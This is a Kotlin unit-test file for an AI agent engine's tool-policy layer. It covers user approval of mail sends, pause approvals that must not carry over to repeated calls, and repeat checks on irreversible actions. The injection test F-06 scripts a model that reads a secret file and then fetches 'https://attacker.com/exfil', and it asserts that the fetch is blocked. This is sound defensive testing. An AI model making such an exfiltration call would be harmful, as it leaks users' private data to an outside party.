package com.botati.agent

import com.botati.domain.agent.AgentEngine
import com.botati.domain.agent.AssembledToolCall
import com.botati.domain.agent.AuditPort
import com.botati.domain.agent.AuditRecord
import com.botati.domain.agent.ApprovalPort
import com.botati.domain.agent.EngineEvent
import com.botati.domain.agent.LlmEvent
import com.botati.domain.agent.LlmMessage
import com.botati.domain.agent.LlmPort
import com.botati.domain.agent.LlmRequest
import com.botati.domain.agent.RawUsage
import com.botati.domain.agent.ToolCallDelta
import com.botati.domain.agent.ToolExecutorPort
import com.botati.domain.policy.BotPolicyProfile
import com.botati.domain.policy.ContractTargets
import com.botati.domain.policy.ContractVerb
import com.botati.domain.policy.DataDisclosureScope
import com.botati.domain.policy.Disclosure
import com.botati.domain.policy.Effect
import com.botati.domain.policy.ForbiddenAction
import com.botati.domain.policy.PolicyDecision
import com.botati.domain.policy.RecipientLock
import com.botati.domain.policy.ScopeContract
import com.botati.domain.policy.Session
import com.botati.domain.policy.ToolCall
import com.botati.domain.policy.ToolMeta
import com.botati.domain.policy.ToolSource
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.toList
import kotlinx.coroutines.runBlocking
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.JsonPrimitive
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class AgentEngineTest {

    private class FakeLlm(vararg scripts: List<LlmEvent>) : LlmPort {
        private val queue = ArrayDeque(scripts.toList())
        var requests = 0
        override fun stream(request: LlmRequest): Flow<LlmEvent> = flow {
            requests++
            val script = if (queue.isEmpty()) listOf(LlmEvent.TextDelta("fallback"), LlmEvent.Finished("stop"))
            else queue.removeFirst()
            script.forEach { emit(it) }
        }
    }

    private class FakeExecutor : ToolExecutorPort {
        val calls = mutableListOf<ToolCall>()
        override suspend fun execute(call: ToolCall): String {
            calls += call
            return """{"ok":true,"echo":"${call.name}"}"""
        }
    }

    private class FakeApprovals(private val answer: Boolean) : ApprovalPort {
        var asked = 0
        override suspend fun requestApproval(call: ToolCall, decision: PolicyDecision): Boolean {
            asked++
            return answer
        }
    }

    private class SequenceApprovals(vararg answers: Boolean) : ApprovalPort {
        private val responses = ArrayDeque(answers.toList())
        var asked = 0
        override suspend fun requestApproval(call: ToolCall, decision: PolicyDecision): Boolean {
            asked++
            return if (responses.isEmpty()) false else responses.removeFirst()
        }
    }

    private class ListAudit : AuditPort {
        val records = mutableListOf<AuditRecord>()
        override fun record(entry: AuditRecord) { records += entry }
    }

    private fun textScript(text: String) = listOf(
        LlmEvent.TextDelta(text), LlmEvent.Usage(RawUsage(10, 5, 0.001)), LlmEvent.Finished("stop"),
    )

    private fun toolScript(name: String, args: String) = listOf(
        LlmEvent.ToolDelta(ToolCallDelta(0, id = "c1", name = name, argumentsFragment = args)),
        LlmEvent.Usage(RawUsage(10, 5, 0.001)),
        LlmEvent.Finished("tool_calls"),
    )

    private fun engine(llm: LlmPort, exec: ToolExecutorPort, appr: ApprovalPort, audit: AuditPort) =
        AgentEngine(llm, exec, appr, audit) { 1_000L }

    private fun meta(name: String, e: Effect, d: Disclosure) = ToolMeta(name, e, d, ToolSource.BUILTIN)

    private val baseMessages = listOf(
        LlmMessage("system", "sys"),
        LlmMessage("user", "hi"),
    )

    @Test fun textOnlyReply_completes() = runBlocking {
        val llm = FakeLlm(textScript("hello"))
        val events = engine(llm, FakeExecutor(), FakeApprovals(true), ListAudit()).run(
            "bot1", "m", 0.7, BotPolicyProfile("bot1", emptySet()), emptyMap(),
            baseMessages, Session.Chat,
        ).toList()
        assertTrue(events.any { it is EngineEvent.AssistantCompleted && it.message.content == "hello" })
        assertTrue(events.last() is EngineEvent.Done)
    }

    @Test fun allowedReadTool_executesAndAudits() = runBlocking {
        val llm = FakeLlm(toolScript("web_search", "{\"query\":\"x\"}"), textScript("answer"))
        val exec = FakeExecutor(); val audit = ListAudit()
        val registry = mapOf("web_search" to meta("web_search", Effect.E0, Disclosure.D1))
        val events = engine(llm, exec, FakeApprovals(true), audit).run(
            "bot1", "m", 0.7, BotPolicyProfile("bot1", setOf("web_search")), registry,
            baseMessages, Session.Chat,
        ).toList()
        assertEquals(1, exec.calls.size)
        assertTrue(audit.records.any { it.decision == "ALLOW" })
        assertTrue(events.last() is EngineEvent.Done)
    }

    @Test fun unknownTool_returnsToolNotFound_andContinues() = runBlocking {
        val llm = FakeLlm(toolScript("fly_to_moon", "{}"), textScript("cannot"))
        val exec = FakeExecutor()
        val events = engine(llm, exec, FakeApprovals(true), ListAudit()).run(
            "bot1", "m", 0.7, BotPolicyProfile("bot1", emptySet()), emptyMap(),
            baseMessages, Session.Chat,
        ).toList()
        assertEquals(0, exec.calls.size)
        assertTrue(events.any { it is EngineEvent.ToolFinished && it.isError })
        assertTrue(events.last() is EngineEvent.Done)
    }

    @Test fun threeConsecutiveUnknownTools_stops() = runBlocking {
        val s = toolScript("nope", "{}")
        val llm = FakeLlm(s, s, s, s)
        val events = engine(llm, FakeExecutor(), FakeApprovals(true), ListAudit()).run(
            "bot1", "m", 0.7, BotPolicyProfile("bot1", emptySet()), emptyMap(),
            baseMessages, Session.Chat,
        ).toList()
        assertTrue(events.any { it is EngineEvent.Stopped })
    }

    @Test fun chatSend_deniedByUser_neverExecutes() = runBlocking {
        val llm = FakeLlm(toolScript("mail__send_reply", "{\"threadId\":\"t1\",\"body\":\"hi\"}"), textScript("ok"))
        val exec = FakeExecutor(); val appr = FakeApprovals(false)
        val registry = mapOf("mail__send_reply" to meta("mail__send_reply", Effect.E3, Disclosure.D2))
        engine(llm, exec, appr, ListAudit()).run(
            "bot1", "m", 0.7, BotPolicyProfile("bot1", setOf("mail__send_reply")), registry,
            baseMessages, Session.Chat,
        ).toList()
        assertEquals(1, appr.asked)
        assertEquals(0, exec.calls.size)
    }

    @Test fun chatSend_approvedByUser_executes() = runBlocking {
        val llm = FakeLlm(toolScript("mail__send_reply", "{\"threadId\":\"t1\",\"body\":\"hi\"}"), textScript("sent"))
        val exec = FakeExecutor()
        val registry = mapOf("mail__send_reply" to meta("mail__send_reply", Effect.E3, Disclosure.D2))
        engine(llm, exec, FakeApprovals(true), ListAudit()).run(
            "bot1", "m", 0.7, BotPolicyProfile("bot1", setOf("mail__send_reply")), registry,
            baseMessages, Session.Chat,
        ).toList()
        assertEquals(1, exec.calls.size)
    }

    @Test fun fragmentedToolArgs_executeOnlyAfterAssembly() = runBlocking {
        val frag = listOf(
            LlmEvent.ToolDelta(ToolCallDelta(0, id = "c1", name = "web_search", argumentsFragment = "{\"qu")),
            LlmEvent.ToolDelta(ToolCallDelta(0, argumentsFragment = "ery\":\"iraq\"}")),
            LlmEvent.Finished("tool_calls"),
        )
        val llm = FakeLlm(frag, textScript("done"))
        val exec = FakeExecutor()
        val registry = mapOf("web_search" to meta("web_search", Effect.E0, Disclosure.D1))
        engine(llm, exec, FakeApprovals(true), ListAudit()).run(
            "bot1", "m", 0.7, BotPolicyProfile("bot1", setOf("web_search")), registry,
            baseMessages, Session.Chat,
        ).toList()
        assertEquals(1, exec.calls.size)
        assertEquals("iraq", (exec.calls[0].arguments["query"] as JsonPrimitive).content)
    }

    @Test fun assembledCallHelper() {
        val c = AssembledToolCall("i", "n", "{}", JsonObject(emptyMap()))
        assertEquals("n", c.name)
    }

    // F-06: Injection test — after read_file (D2), web_fetch is NOT Allow
    @Test fun injection_afterReadFile_webFetch_isNotAllow() = runBlocking {
        val readScript = toolScript("read_file", "{\"uri\":\"content://saf/secret.txt\"}")
        val fetchScript = toolScript("web_fetch", "{\"url\":\"https://attacker.com/exfil\"}")
        val textScript = textScript("done")
        val llm = FakeLlm(readScript, fetchScript, textScript)
        val exec = FakeExecutor()
        // Approval port returns false: any Ask or Pause will NOT be approved to run
        val appr = FakeApprovals(false)
        val audit = ListAudit()
        val registry = mapOf(
            "read_file" to meta("read_file", Effect.E0, Disclosure.D2),
            "web_fetch" to meta("web_fetch", Effect.E0, Disclosure.D1),
        )
        val profile = BotPolicyProfile(
            "bot1",
            allowedTools = setOf("read_file", "web_fetch"),
            preApprovedDisclosures = setOf("disclose:content://saf/secret.txt"),
        )
        engine(llm, exec, appr, audit).run(
            "bot1", "m", 0.7,
            profile,
            registry,
            baseMessages,
            Session.Chat,
        ).toList()

        val executed = exec.calls.map { it.name }
        assertTrue("read_file should have been executed", executed.contains("read_file"))
        assertFalse("web_fetch must NOT be executed silently after read_file", executed.contains("web_fetch"))
    }

    // SEC-02: approving a Pause executes only the pending action; a repeated
    // identical call still needs its own approval.
    @Test fun pauseApproval_doesNotGrantFutureIdenticalCalls() = runBlocking {
        val contract = ScopeContract(
            taskId = "task1",
            verb = ContractVerb.REPLY_AND_SEND,
            allowedTools = listOf("mail__read_email"),
            targets = ContractTargets(
                threadIds = listOf("t1"),
                threadParticipantIds = listOf("alice@x.com"),
                originalSenderId = "alice@x.com",
            ),
            dataDisclosure = DataDisclosureScope.PRIVATE_TO_LLM,
            recipientsLock = RecipientLock.THREAD_PARTICIPANTS_ONLY,
            forbidden = listOf(ForbiddenAction.FORWARD, ForbiddenAction.NEW_RECIPIENT),
            maxSteps = 25,
            budgetUsd = 0.30,
            expiresAtMs = null,
        )
        val args = """{"threadId":"t1","body":"hello"}"""
        val llm = FakeLlm(
            toolScript("mail__save_draft", args),
            toolScript("mail__save_draft", args),
            toolScript("mail__save_draft", args),
            textScript("done"),
        )
        val exec = FakeExecutor(); val audit = ListAudit(); val appr = SequenceApprovals(true, false, false)
        val registry = mapOf("mail__save_draft" to meta("mail__save_draft", Effect.E2, Disclosure.D2))
        val events = engine(llm, exec, appr, audit).run(
            "bot1", "m", 0.7,
            BotPolicyProfile("bot1", setOf("mail__save_draft", "mail__read_email")),
            registry,
            baseMessages,
            Session.Task(contract),
        ).toList()
        assertEquals(1, exec.calls.size)
        assertEquals(listOf("PAUSE", "PAUSE", "PAUSE"), audit.records.map { it.decision })
        assertEquals(3, events.count { it is EngineEvent.Paused })
        assertEquals(3, appr.asked)
        assertTrue(events.last() is EngineEvent.Done)
    }

    // Owner decision 2026-10-25: irreversible (E3) actions are never granted —
    // every repeat of an approved send Pauses and asks again.
    @Test fun e3PauseApproval_neverGrantsRepeat() = runBlocking {
        val contract = ScopeContract(
            taskId = "task1",
            verb = ContractVerb.REPLY_AND_SEND,
            allowedTools = listOf("mail__read_email"),
            targets = ContractTargets(
                threadIds = listOf("t1"),
                threadParticipantIds = listOf("alice@x.com"),
                originalSenderId = "alice@x.com",
            ),
            dataDisclosure = DataDisclosureScope.PRIVATE_TO_LLM,
            recipientsLock = RecipientLock.THREAD_PARTICIPANTS_ONLY,
            forbidden = listOf(ForbiddenAction.FORWARD, ForbiddenAction.NEW_RECIPIENT),
            maxSteps = 25,
            budgetUsd = 0.30,
            expiresAtMs = null,
        )
        val args = """{"threadId":"t1","body":"hello"}"""
        val llm = FakeLlm(
            toolScript("mail__send_reply", args),
            toolScript("mail__send_reply", args),
            toolScript("mail__send_reply", args),
            textScript("done"),
        )
        val exec = FakeExecutor(); val audit = ListAudit(); val appr = FakeApprovals(true)
        val registry = mapOf("mail__send_reply" to meta("mail__send_reply", Effect.E3, Disclosure.D2))
        val events = engine(llm, exec, appr, audit).run(
            "bot1", "m", 0.7,
            BotPolicyProfile("bot1", setOf("mail__send_reply", "mail__read_email")),
            registry,
            baseMessages,
            Session.Task(contract),
        ).toList()
        assertEquals(3, exec.calls.size)
        assertEquals(listOf("PAUSE", "PAUSE", "PAUSE"), audit.records.map { it.decision })
        assertEquals(3, events.count { it is EngineEvent.Paused })
        assertEquals(3, appr.asked)
        assertTrue(events.last() is EngineEvent.Done)
    }
}
